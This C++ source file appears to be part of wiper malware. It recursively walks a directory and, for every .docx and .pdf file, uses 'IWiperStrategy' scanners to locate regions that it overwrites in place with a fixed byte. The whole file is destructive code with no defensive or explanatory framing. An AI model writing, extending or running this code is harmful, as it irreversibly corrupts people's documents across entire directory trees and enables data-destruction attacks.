#include "FileProcessor.h"
#include "DocxStrategy.h"
#include "PdfStrategy.h"
#include <fstream>
#include <iostream>
#include <memory>

namespace fs = std::filesystem;

void FileProcessor::processDirectory(const fs::path& dirPath, uint8_t key) {
    if (!fs::exists(dirPath) || !fs::is_directory(dirPath)) {
        std::cerr << "[-] Invalid directory: " << dirPath << std::endl;
        return;
    }

    for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            processFile(entry.path(), key);
        }
    }
}

void FileProcessor::processFile(const fs::path& filePath, uint8_t key) {
    std::string ext = filePath.extension().string();
    std::unique_ptr<IWiperStrategy> strategy;

    if (ext == ".docx") {
        strategy = std::make_unique<DocxStrategy>();
    }
    else if (ext == ".pdf") {
        strategy = std::make_unique<PdfStrategy>();
    }
    else {

        // Unsupported type
        return;
    }

    Overwrite(filePath, key);

}

bool FileProcessor::Overwrite(const fs::path& path, char charToOverrideWith) {
    std::fstream file(path, std::ios::binary | std::ios::in | std::ios::out);
    if (!file.is_open()) return false;

    // Load file to memory for analysis
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> buffer(fileSize);
    file.read(reinterpret_cast<char*>(buffer.data()), fileSize);

    // Identify targets
    auto strategy = (path.extension() == ".docx") ?
        std::unique_ptr<IWiperStrategy>(new DocxStrategy()) :
        std::unique_ptr<IWiperStrategy>(new PdfStrategy());

    std::vector<WipeInterval> intervals = strategy->scan(buffer);

    if (intervals.empty()) return false;

    // Apply to disk
    for (const auto& interval : intervals) {

        // Overwrite
        std::vector<char> intervalBuffer(interval.length, charToOverrideWith);

        file.seekp(interval.offset);
        file.write(intervalBuffer.data(), interval.length);
    }

    return true;
}